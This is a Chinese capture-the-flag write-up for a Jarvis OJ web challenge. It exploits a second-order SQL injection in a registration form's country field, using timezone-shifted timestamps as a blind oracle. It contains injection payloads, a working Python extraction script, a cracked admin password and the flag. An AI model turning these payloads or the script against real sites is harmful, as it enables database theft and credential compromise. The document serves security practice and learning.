## 描述

题目入口：http://web.jarvisoj.com:32796/

Hint1: 二次注入

Hint2: register 二次注入在country

## 题解

什么花里胡哨的界面。。。

首先随便试了下登录，用户名、密码都为 a 直接就进去了，难道这是假的登录？

wdnmd，后来试了下好像是直接猜对了用户名密码？？？？？？？？？这也太不走心了吧。。难不成是想让我们弱口令爆破一下得到一个低权限账号。。然后再去搞事？只是恰好我试对了？？？

在里面到处点了点，没点出什么花样来，但是发现了这个链接

http://web.jarvisoj.com:32796/index.php?page=index

可能有是会在末尾加上 `.php` 的操作？

不管了，为了完整的体验，我们从头开始，假装我们不知道那个账号密码，先扫为敬。扫出了挺多东西的（而且还没登录）

`config.php`、`register.php`、`test.php`、`hacker.php`、`user.class.php`、`login.php` 均为 200。一个个试。

`login.php` 乱试密码的话，均为相同的提示，所以没办法盲注这种操作，先放一边。剩下的只有 `register.php` 能用，突破口应该是这。

经过了我两次注册后，我懂了，a 是别人注册留下来的账号。。。。。。。。。。我。。。。。。

既然提示是注入，那么我们看看这个注册能否注入东西。

折腾了很久以后，没进展。开始搜索 `二次注入` 的关键词，然后找到了这篇文章 http://tinyfisher.github.io/security/2018/04/10/threehit

学习了一发，结合提示，大概知道这题要考啥了。

首先随便注册一个账号后，能发现 http://web.jarvisoj.com:32796/index.php?page=info 里时间会动，说明这个邮件是即时生成的，应该就是能二次注入显示的地方了，题目提示了 Country 可以注入，但是注入了的话应该得有一个地方变化才能进行注入或者盲注呀。突然发现 Country 是不是会影响 Date！我新注册了几个不同城市的，发现，Date 变了！！！不同时区不同时间！

尝试 `'#` 是标准 UTC，而 `'or 1#` 是 UTC+8。可以开始了。

但是注意，服务器的 WAF 还是有点厉害的，子串里不能有 `where`、`table`、`column`、`information`、`/`、`limit`，玩蛇皮，双写、大小写都绕不过。绕过大全 https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html 都找不到能解决的方法。我只能得到数据库名是 `wctf`。

在搜索解决方法的途中搜到一个不错的盲注文章 https://www.freebuf.com/articles/web/30841.html 虽然对本题没帮助。

最后还是不得不看题解了呀。

MD，猜表。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。

表名是 users。我们用

```
cmd = "select group_concat(a) from (select 1`a`,2,3,4 union select * from users)`b`"
```

（注意得用 ``` ` ``` 来包字符串，因为 `'` 在前面用过了，以及注意长度，太长了会被截断然后 GG）

不断递增数字来猜测列的数目（起码是 4，因为注册信息告诉我们的），然后猜到 5 列就出来了。代码如下

```python
import requests
import sys
import random, re
import datetime
register_url = 'http://web.jarvisoj.com:32796/register.php'
login_url = 'http://web.jarvisoj.com:32796/login.php'
check_url = 'http://web.jarvisoj.com:32796/index.php?page=info'
data = {
    'username': '',
    'password': 'gg',
    'address': 'mf',
    'country': '',
}
cmd = "select group_concat(a) from (select 1,2`a`,3,4,5 union select * from users)`b`"
country = "' or ascii(substr(({}),{},1))>{}#"
reg = re.compile(r'(\d\d):\d\d:\d\d')
for i in range(1, 100):
    l, r = 1, 127
    while l <= r:
        sess = requests.session()
        m = (l + r) >> 1
        data['username'] = 'xalanq' + str(random.randint(1, 100000000))
        data['country'] = country.format(cmd, i, m)
        t = sess.post(register_url, data=data)
        if 'has been registered' in t.text:
            continue
        if 'Hacker!' in t.text:
            print("cmd is defended by WAF")
            exit(0)
        login_data = {'username': data['username'], 'password': data['password']}
        t = sess.post(login_url, data=login_data)
        t = sess.get(check_url)
        h = int(reg.findall(t.text)[0])
        nh = datetime.datetime.now().hour
        if h == nh:
            l = m + 1
        else:
            r = m - 1
    if r <= 0:
        break
    print(chr(l), end='')
    sys.stdout.flush()
print()
```

得到 `2,admin,s`，所以第 2 列应该就是用户名了，猜测第 3 列是密码。改下上面代码为

```
cmd = "select group_concat(a) from (select 1,2,3`a`,4,5 union select * from users)`b`"
```

就好。得到 admin 的密码 9a73fd18fedd9643357ffe20b9d974e4，查表得知为 CleverBoy

## 答案

flag{URst0rong}
